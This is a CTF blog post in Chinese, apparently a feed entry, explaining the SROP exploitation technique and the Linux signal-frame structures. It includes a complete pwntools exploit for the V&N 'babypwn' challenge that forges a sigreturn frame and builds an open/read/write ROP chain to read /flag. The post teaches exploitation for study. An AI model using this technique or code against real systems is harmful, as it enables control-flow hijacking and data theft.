    <content type="html"><![CDATA[<h2 id="什么是SROP"><a href="#什么是SROP" class="headerlink" title="什么是SROP"></a>什么是SROP</h2><p><code>SROP</code> 全称<code>Sigreturn Oriented Programming</code>，<code>sigreturn</code>是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用。</p><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。一般来说，信号机制常见的步骤如下图所示：</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-1.png" class="lozad"></p><p>包含的流程包括：</p><ol><li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li><li>内核会为该进程保存相应的上下文，将当前的信息压入栈中（栈寄存器等），以及将 sigreturn系统调用地址压入栈中。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</li><li>执行 sigreturn 系统调用，恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119，64 位的系统调用号为 15。</li></ol><p>保存在栈中的进程上下文信息为<code>ucontext_t</code>结构体，称其为<code>Signal Frame</code>，其结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// defined in /usr/include/sys/ucontext.h</span></span><br><span class="line"><span class="comment">/* Userlevel context.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> uc_flags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span> *<span class="title">uc_link</span>;</span></span><br><span class="line">    <span class="keyword">stack_t</span> uc_stack;           <span class="comment">// the stack used by this context</span></span><br><span class="line">    <span class="keyword">mcontext_t</span> uc_mcontext;     <span class="comment">// the saved context</span></span><br><span class="line">    <span class="keyword">sigset_t</span> uc_sigmask;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpstate</span> __<span class="title">fpregs_mem</span>;</span></span><br><span class="line">  &#125; <span class="keyword">ucontext_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// defined in /usr/include/bits/types/stack_t.h</span></span><br><span class="line"><span class="comment">/* Structure describing a signal stack.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ss_sp;</span><br><span class="line">    <span class="keyword">size_t</span> ss_size;</span><br><span class="line">    <span class="keyword">int</span> ss_flags;</span><br><span class="line">  &#125; <span class="keyword">stack_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// difined in /usr/include/bits/sigcontext.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> __pad0;</span><br><span class="line">  <span class="keyword">__uint64_t</span> err;</span><br><span class="line">  <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">  <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由于<code>Signal Frame</code>是在用户态的栈中，因此若在栈中伪造<code>Signal Frame</code>，同时调<code>sigreturn</code>系统调用，即可实现对所有寄存器的控制包括rip，从而实现攻击。</p><p>如若只想调用执行一个函数，如get shell，则可直接将rip指向system，将rdi指向binsh地址即可，如下图所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-2.png" class="lozad"></p><p>如果想执行一系列函数，我们可以通过rsp指针来实现相应的rop链，包括两个步骤：</p><ul><li>控制栈指针。</li><li>把原来 rip 指向的syscall gadget 换成syscall; ret gadget。</li></ul><p>示意图如下所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-3.png" class="lozad"></p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>以V&amp;N招新赛babypwn为例</p><p>思路如下：</p><p>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><p>参考文章  :</p><p><a href="https://ray-cp.github.io/archivers/srop-analysis" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/srop-analysis</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是SROP&quot;&gt;&lt;a href=&quot;#什么是SROP&quot; class=&quot;headerlink&quot; title=&quot;什么是SROP&quot;&gt;&lt;/a&gt;什么是SROP&lt;/h2&gt;&lt;p&gt;&lt;code&gt;SROP&lt;/code&gt; 全称&lt;code&gt;Sigreturn Oriented Progr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
